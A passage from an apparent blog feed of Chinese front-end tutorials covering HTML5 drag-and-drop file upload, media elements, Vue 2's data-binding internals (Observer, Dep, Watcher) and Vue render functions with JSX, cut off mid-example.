punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"droptarget"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">handleEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span>      output <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      data<span class="token punctuation">,</span> xhr<span class="token punctuation">,</span>      files<span class="token punctuation">,</span> i<span class="token punctuation">,</span> len<span class="token punctuation">;</span>  EventUtil<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">==</span> <span class="token string">"drop"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    files <span class="token operator">=</span> event<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span>files<span class="token punctuation">;</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>      data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"file"</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"post"</span><span class="token punctuation">,</span> <span class="token string">"FileAPIExample.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="媒体元素"><a href="#媒体元素" class="headerlink" title="媒体元素"></a>媒体元素</h4><ul><li><code>&lt;video&gt;</code>视频元素<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>video id<span class="token operator">=</span><span class="token string">"myVideo"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>source src<span class="token operator">=</span><span class="token string">"conference.webm"</span> type<span class="token operator">=</span><span class="token string">"video/webm; codecs = 'vp8, vorbis'"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">></span>  <span class="token operator">&lt;</span>source src<span class="token operator">=</span><span class="token string">"conference.ogv"</span> type<span class="token operator">=</span><span class="token string">"video/ogg; codecs = 'theora, vorbis'"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">></span>  <span class="token operator">&lt;</span>source src<span class="token operator">=</span><span class="token string">"conference.mpg"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">></span>  Video Player not available<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>video<span class="token operator">></span></code></pre></li><li><code>&lt;audio&gt;</code>音频元素<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>audio id<span class="token operator">=</span><span class="token string">"myAudio"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>source src<span class="token operator">=</span><span class="token string">"song.ogg"</span> type<span class="token operator">=</span><span class="token string">"audio/ogg"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">></span>  <span class="token operator">&lt;</span>source src<span class="token operator">=</span><span class="token string">"song.mp3"</span> type<span class="token operator">=</span><span class="token string">"audio/mpeg"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">></span>  Audio Player not available<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>audio<span class="token operator">></span></code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> 拖放 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习（三）之数据双向绑定源码解析</title>
      <link href="/2018/10/17/vue-xue-xi-san-zhi-shu-ju-shuang-xiang-bang-ding-yuan-ma-jie-xi/"/>
      <url>/2018/10/17/vue-xue-xi-san-zhi-shu-ju-shuang-xiang-bang-ding-yuan-ma-jie-xi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>基于vue2.0<br>基础知识：TypeScript、ES6、ES5</p></blockquote><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>我们将通过分析，简化源码概览数据绑定过程<br><img src="/img/in-post/vue-02.JPG" alt="基本目录结构"></p><ul><li>observer中实现数据双向绑定过程</li></ul><h4 id="Observer类"><a href="#Observer类" class="headerlink" title="Observer类"></a>Observer类</h4><p>我们从Observer类的入口开始分析整个数据绑定过程；在源码中定义了这个类的作用：每个观察的值/对象都绑定了一个Observer类，一旦绑定，这个类能将目标对象的属性键值转换为进行依赖收集和调度更新的getter/setter；忽略处理数组和隐藏属性的操作，一个简化的Observer类如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * Observer class that is attached to each observed * object. Once attached, the observer converts the target * object's property keys into getter/setters that * collect dependencies and dispatch updates. */</span><span class="token keyword">class</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>  value<span class="token punctuation">:</span> any<span class="token punctuation">;</span>  dep<span class="token punctuation">:</span> Dep<span class="token punctuation">;</span>  vmCount<span class="token punctuation">:</span> number<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// number of vms that have this object as root $data</span>  constructor <span class="token punctuation">(</span>value<span class="token punctuation">:</span> any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token keyword">this</span><span class="token punctuation">.</span>dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>vmCount <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">walk</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">/**   * Walk through all properties and convert them into   * getter/setters. This method should only be called when   * value type is Object.   */</span>  walk <span class="token punctuation">(</span>obj<span class="token punctuation">:</span> Object<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> keys <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">defineReactive</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>observe()</code>：为值创建一个observer类实例</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> observe <span class="token punctuation">(</span>value<span class="token punctuation">:</span> any<span class="token punctuation">,</span> asRootData<span class="token punctuation">:</span> <span class="token operator">?</span>boolean<span class="token punctuation">)</span><span class="token punctuation">:</span> Observer <span class="token operator">|</span> <span class="token keyword">void</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> value <span class="token keyword">instanceof</span> <span class="token class-name">VNode</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">let</span> ob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>asRootData <span class="token operator">&amp;&amp;</span> ob<span class="token punctuation">)</span> <span class="token punctuation">{</span>  ob<span class="token punctuation">.</span>vmCount<span class="token operator">++</span><span class="token punctuation">}</span><span class="token keyword">return</span> ob<span class="token punctuation">}</span></code></pre></li><li><p><code>defineReactive()</code>：为对象定义一个响应式的属性</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/*** Define a reactive property on an Object.*/</span><span class="token keyword">export</span> <span class="token keyword">function</span> defineReactive <span class="token punctuation">(</span>obj<span class="token punctuation">:</span> Object<span class="token punctuation">,</span>key<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">const</span> dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断属性存在且能把属性修改为访问器属性</span><span class="token keyword">const</span> property <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptor</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>property <span class="token operator">&amp;&amp;</span> property<span class="token punctuation">.</span>configurable <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">}</span>val <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">let</span> childOb <span class="token operator">=</span> <span class="token function">observe</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>  enumerable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token keyword">function</span> reactiveGetter <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> value <span class="token operator">=</span> val    <span class="token keyword">if</span> <span class="token punctuation">(</span>Dep<span class="token punctuation">.</span>target<span class="token punctuation">)</span> <span class="token punctuation">{</span>      dep<span class="token punctuation">.</span><span class="token function">depend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 订阅器订阅</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>childOb<span class="token punctuation">)</span> <span class="token punctuation">{</span>        childOb<span class="token punctuation">.</span>dep<span class="token punctuation">.</span><span class="token function">depend</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> value  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//在对象上设置属性。如果属性不存在，则添加新属性并触发更改通知。</span>  <span class="token keyword">set</span><span class="token punctuation">:</span> <span class="token keyword">function</span> reactiveSetter <span class="token punctuation">(</span>newVal<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> value <span class="token operator">=</span> val    <span class="token comment" spellcheck="true">/* eslint-disable no-self-compare */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newVal <span class="token operator">===</span> value <span class="token operator">||</span> <span class="token punctuation">(</span>newVal <span class="token operator">!==</span> newVal <span class="token operator">&amp;&amp;</span> value <span class="token operator">!==</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span>    <span class="token punctuation">}</span>    val <span class="token operator">=</span> newVal    childOb <span class="token operator">=</span> <span class="token function">observe</span><span class="token punctuation">(</span>newVal<span class="token punctuation">)</span>    dep<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 订阅器通知</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="Dep类"><a href="#Dep类" class="headerlink" title="Dep类"></a>Dep类</h4><p>Dep是一个依赖收集器，可以有多个指令订阅</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Dep</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> target<span class="token punctuation">:</span> <span class="token operator">?</span>Watcher<span class="token punctuation">;</span>  id<span class="token punctuation">:</span> number<span class="token punctuation">;</span>  subs<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>Watcher<span class="token operator">></span><span class="token punctuation">;</span>  constructor <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> uid<span class="token operator">++</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>subs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span>  addSub <span class="token punctuation">(</span>sub<span class="token punctuation">:</span> Watcher<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sub<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  depend <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Dep<span class="token punctuation">.</span>target<span class="token punctuation">)</span> <span class="token punctuation">{</span>      Dep<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">addDep</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  notify <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// stabilize the subscriber list first</span>    <span class="token keyword">const</span> subs <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">=</span> subs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> l<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      subs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// The current target watcher being evaluated.</span><span class="token comment" spellcheck="true">// This is globally unique because only one watcher</span><span class="token comment" spellcheck="true">// can be evaluated at a time.</span>Dep<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">const</span> targetStack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">export</span> <span class="token keyword">function</span> pushTarget <span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token operator">?</span>Watcher<span class="token punctuation">)</span> <span class="token punctuation">{</span>  targetStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  Dep<span class="token punctuation">.</span>target <span class="token operator">=</span> target<span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">function</span> popTarget <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  targetStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  Dep<span class="token punctuation">.</span>target <span class="token operator">=</span> targetStack<span class="token punctuation">[</span>targetStack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h4 id="Watcher类"><a href="#Watcher类" class="headerlink" title="Watcher类"></a>Watcher类</h4><p>Watcher类能够解析一个表达式，收集依赖，并且在表达式的值改变的时候触发回调函数。可以用于<code>$watch()</code>api和指令</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> uid <span class="token operator">=</span> <span class="token number">0</span><span class="token comment" spellcheck="true">/** * A watcher parses an expression, collects dependencies, * and fires callback when the expression value changes. * This is used for both the $watch() api and directives. */</span><span class="token keyword">class</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>  vm<span class="token punctuation">:</span> Component<span class="token punctuation">;</span>  expression<span class="token punctuation">:</span> string<span class="token punctuation">;</span>  cb<span class="token punctuation">:</span> Function<span class="token punctuation">;</span>  id<span class="token punctuation">:</span> number<span class="token punctuation">;</span>  deps<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>Dep<span class="token operator">></span><span class="token punctuation">;</span>  newDeps<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>Dep<span class="token operator">></span><span class="token punctuation">;</span>  depIds<span class="token punctuation">:</span> SimpleSet<span class="token punctuation">;</span>  newDepIds<span class="token punctuation">:</span> SimpleSet<span class="token punctuation">;</span>  value<span class="token punctuation">:</span> any<span class="token punctuation">;</span>  constructor <span class="token punctuation">(</span>    vm<span class="token punctuation">:</span> Component    cb<span class="token punctuation">:</span> Function  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>cb <span class="token operator">=</span> cb    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token operator">++</span>uid <span class="token comment" spellcheck="true">// uid for batching</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>deps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>newDeps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>depIds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>newDepIds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * Evaluate the getter, and re-collect dependencies.   */</span>  <span class="token keyword">get</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">pushTarget</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>getter<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> vm<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">popTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> value  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * Add a dependency to this directive.   */</span>  addDep <span class="token punctuation">(</span>dep<span class="token punctuation">:</span> Dep<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> dep<span class="token punctuation">.</span>id    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>newDepIds<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>newDepIds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>newDeps<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>dep<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>depIds<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        dep<span class="token punctuation">.</span><span class="token function">addSub</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * Subscriber interface.   * Will be called when a dependency changes.   */</span>  update <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * Scheduler job interface.   * Will be called by the scheduler.   */</span>  run <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> oldValue <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!==</span> oldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value      <span class="token keyword">this</span><span class="token punctuation">.</span>cb<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>vm<span class="token punctuation">,</span> value<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * Depend on all deps collected by this watcher.   */</span>  depend <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deps<span class="token punctuation">.</span>length    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>deps<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">depend</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Compile类"><a href="#Compile类" class="headerlink" title="Compile类"></a>Compile类</h4><p>我们知道，Observer类是在数据劫持时进行实例化并添加到Dep中的，那么Watcher则是在模板编译的时候实例化并添加订阅的。Compile类能够解析模板指令并将模板中的变量替换成实际数据，然后初始化渲染视图；同时，为每个指令绑定对应的订阅者和回调函数，当触发更新回调时，更新视图</p><h4 id="MVVM总结"><a href="#MVVM总结" class="headerlink" title="MVVM总结"></a>MVVM总结</h4><ul><li>在Observer类中通过数据劫持的方式，也就是ES5中的<code>Object.defineProperty</code>，递归遍历观测对象的属性值，通过getter/setter观测数据</li><li>Dep类是一个管理Observer(观察者)和Watcher(订阅者)的中心，观察者和订阅者是一对多的关系，当setter中数据发生变化，会通知订阅中心Dep，Dep遍历通知订阅者更新</li><li>Watcher类是一个订阅者，收到更新通知时，会执行自身的回调函数，完成视图更新</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习（二）之渲染函数</title>
      <link href="/2018/10/16/vue-xue-xi-er-zhi-xuan-ran-han-shu/"/>
      <url>/2018/10/16/vue-xue-xi-er-zhi-xuan-ran-han-shu/</url>
      
        <content type="html"><![CDATA[<h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><ul><li>一般我们通过模板可以快速的创建一个HTML；但是在某些情况下使用render 函数可以让我们使用JavaScript更加快速地创建页面</li><li>vue渲染过程：模板通过编译生成AST，再由AST生成Vue的render函数（渲染函数），渲染函数结合数据生成Virtual DOM树，Diff和Patch后生成新的UI<pre class=" language-JavaScript"><code class="language-JavaScript"><script type="text/x-template" id="anchored-heading-template"><h1 v-if="level === 1">  <slot></slot></h1><h2 v-else-if="level === 2">  <slot></slot></h2><h3 v-else-if="level === 3">  <slot></slot></h3><h4 v-else-if="level === 4">  <slot></slot></h4><h6 v-else-if="level === 6">  <slot></slot></h6></script>//render写法Vue.component('anchored-heading', {render: function (createElement) {  return createElement(    'h' + this.level,   // 标签名称    this.$slots.default // 子元素数组  )},props: {  level: {    type: Number,    required: true  }}})</code></pre></li><li>补充知识：<ul><li><code>vm.$slots</code>:<code>{[name: string]: ?Array&lt;VNode&gt; }</code>：用来访问被插槽分发的内容。每个具名插槽 有其相应的属性 (例如：slot=”foo” 中的内容将会在 vm.$slots.foo 中被找到)。default 属性包括了所有没有被包含在具名插槽中的节点</li><li><code>vm.$scopedSlots</code>:<code>{ [name: string]: props =&gt; VNode | Array&lt;VNode&gt; }</code>:用来访问作用域插槽。对于包括 默认 slot 在内的每一个插槽，该对象都包含一个返回相应 VNode 的函数；子组件的数据可以显示在引用的父组件上</li><li>模板：Vue的模板基于纯HTML，基于Vue的模板语法，我们可以比较方便地声明数据和UI的关系著作权归作者所有</li><li>AST：AST是Abstract Syntax Tree的简称，Vue使用HTML的Parser将HTML模板解析为AST，并且对AST进行一些优化的标记处理，提取最大的静态树，方便Virtual DOM时直接跳过Diff</li><li><strong>虚拟节点</strong>：createElement 返回值会告诉 Vue 页面上需要渲染什么样的节点，及其子节点。我们把这样的节点描述为“虚拟节点 (Virtual Node)”，也常简写它为“VNode”。“虚拟 DOM”是我们对由 Vue 组件树建立起来的整个 VNode 树的称呼<br><img src="/img/in-post/vue-03.JPG" alt="vdom"></li></ul></li></ul><h4 id="深入理解"><a href="#深入理解" class="headerlink" title="深入理解"></a>深入理解</h4><ul><li><code>createElement</code><pre class=" language-JavaScript"><code class="language-JavaScript">// 返回虚拟节点createElement(/*** 必需参数①：一个HTML标签字符串 | 组件选项对象 |* 解析前面任意一种的async异步参数*/'div',/*** 可选参数②：一个包含模板相关属性的数据对象，* 可以在 template 中使用这些特性*/{  // (详情见下一节)},/*** 选参数③：子虚拟节点 (VNodes)或者虚拟节点数组，由`createElement()` 构建而成，* 也可以使用字符串来生成“文本虚拟节点*/[  '先写一些文字',  createElement('h1', '一则头条'),  createElement(MyComponent, {    props: {      someProp: 'foobar'    }  })])</code></pre></li><li><code>v-if</code>用判断语句重写<pre class=" language-JavaScript"><code class="language-JavaScript">props: ['items'],render: function (createElement) {if (this.items.length) {  return createElement('ul', this.items.map(function (item) {    return createElement('li', item.name)  }))} else {  return createElement('p', 'No items found.')}}</code></pre></li><li><code>v-for</code>用map重写<pre class=" language-JavaScript"><code class="language-JavaScript">render: function (createElement) {return createElement('div',  Array.apply(null, { length: 20 }).map(function () {    return createElement('p', 'hi')  }))}</code></pre></li><li><code>v-model</code>底层重写<pre class=" language-JavaScript"><code class="language-JavaScript">props: ['value'],render: function (createElement) {var self = thisreturn createElement('input', {  domProps: {    value: self.value  },  on: {    input: function (event) {      self.$emit('input', event.target.value)    }  }})}</code></pre></li></ul><h4 id="JSX语法"><a href="#JSX语法" class="headerlink" title="JSX语法"></a>JSX语法</h4><p> Babel 插件，用于在 Vue 中使用 JSX 语法，它可以让我们回到更接近于模板的语法上</p><pre class=" language-JavaScript"><code class="language-JavaScript"> new Vue({  el: '#demo',  render: function (h) {    return (      <AnchoredHeading level={1}>        <span>Hello</span> world!      </AnchoredHeading>    )  